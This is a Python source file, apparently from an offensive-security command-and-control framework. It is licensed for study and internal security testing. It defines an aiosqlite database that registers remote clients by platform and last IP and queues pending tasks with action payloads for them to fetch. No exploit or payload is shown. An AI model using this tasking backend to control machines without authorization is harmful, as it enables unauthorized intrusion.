"""
Copyright (c) 2026 José María Micoli
Licensed under {'license_type': 'AGPLv3'}

You may:
✔ Study
✔ Modify
✔ Use for internal security testing

You may NOT:
✘ Offer as a commercial service
✘ Sell derived competing products
"""

import aiosqlite
import json

DB_PATH = "hydra_heads.db"

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS clients (
                client_id TEXT PRIMARY KEY,
                platform TEXT,
                last_ip TEXT,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS tasks (
                task_id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                action TEXT,
                payload TEXT,
                status TEXT DEFAULT 'pending'
            )
        """)
        await db.commit()

async def register_client(client_id, platform, last_ip):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT OR REPLACE INTO clients (client_id, platform, last_ip, last_seen)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP)
        """, (client_id, platform, last_ip))
        await db.commit()

async def get_pending_task(client_id):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT * FROM tasks WHERE client_id = ? AND status = 'pending' LIMIT 1",
            (client_id,)
        ) as cursor:
            return await cursor.fetchone()

async def complete_task(task_id):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE tasks SET status = 'completed' WHERE task_id = ?", (task_id,))
        await db.commit()

async def add_task(client_id, action, payload):
    """Bridge for FastAPI to add tasks to the database asynchronously."""
    async with aiosqlite.connect(DB_PATH) as db:
        payload_json = json.dumps(payload)
        await db.execute("""
            INSERT INTO tasks (client_id, action, payload, status)
            VALUES (?, ?, ?, 'pending')
        """, (client_id, action, payload_json))
        await db.commit()